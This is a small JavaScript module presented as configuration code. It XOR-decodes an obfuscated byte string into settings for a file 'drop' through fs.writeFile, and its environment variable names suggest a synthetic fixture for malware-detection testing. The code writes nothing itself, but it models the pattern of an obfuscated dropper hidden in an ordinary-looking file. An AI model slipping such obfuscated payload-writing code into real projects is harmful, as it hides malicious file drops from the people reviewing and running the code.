// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_c3ad64ac = "\\u0098\\u00e7\\u0038\\u0019\\u0097\\u009a\\u00bf\\u0079\\u0016\\u00d9\\u008a\\u00bf\\u006a\\u000a\\u0080\\u008b\\u0085\\u006c\\u0008\\u0086\\u008b\\u00be\\u006d\\u0000\\u0080\\u00c2\\u00ad\\u007b\\u000c\\u0090\\u008b\\u0085\\u006f\\u000c\\u0088\\u008b\\u00a6\\u0068\\u0001\\u0085\\u009e\\u00ae\\u006c\\u0017\\u00d9\\u008c\\u00af\\u006f\\u0003\\u0081\\u009c\\u0085\\u007d\\u000a\\u00bb\\u0099\\u00a8\\u0060\\u0011\\u0081\\u0088\\u00b3\\u0065\\u0000\\u0098\\u009d\\u00ae\\u0068\\u0002\\u0081\\u00b1\\u00b9\\u0066\\u0010\\u008a\\u009a\\u00e7\\u0038\\u0019\\u0087\\u008f\\u00b7\\u0079\\u0004\\u008d\\u0089\\u00b4\\u0056\\u000c\\u0080\\u00d3\\u0094\\u0046\\u0021\\u00a1\\u00c3\\u00ee\\u0039\\u0023\\u00d6\\u00da\\u00e8\\u003b\\u0051\\u0098\\u0088\\u00b3\\u0065\\u0000\\u00bb\\u009e\\u00bb\\u007d\\u000d\\u00d9\\u00c1\\u00ae\\u0064\\u0015\\u00cb\\u0086\\u00af\\u0067\\u0011\\u0096\\u008b\\u00a9\\u007a\\u0048\\u008a\\u0081\\u00be\\u006c\\u004a\\u00ca\\u009d\\u00ae\\u0068\\u0002\\u0081\\u00c3\\u00ee\\u0039\\u0003\\u00d6\\u00da\\u00e8\\u003b\\u0051\\u0086\\u00db\\u00e9\\u0068\\u004b\\u0089\\u0084\\u00a9";
const Codec_c3ad64ac = "unicode_escapes|repeating_key_xor|ee,da,09,65,e4";

function load_c3ad64ac() { return [...Material_c3ad64ac.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_c3ad64ac(e) { const keyBytes = [238,218,9,101,228]; return e.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
async function recover_c3ad64ac() {
  const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const e = load_c3ad64ac(); let d = [];
  const decodeTarget = decode_c3ad64ac; d = decodeTarget(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_c3ad64ac() { return Buffer.from(await recover_c3ad64ac(), "utf8").toString("utf8"); }
async function plan_c3ad64ac() { const inspect = inspect_c3ad64ac; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "buffer_to_writefile", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_c3ad64ac;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_c3ad64ac());

// reconstruction complete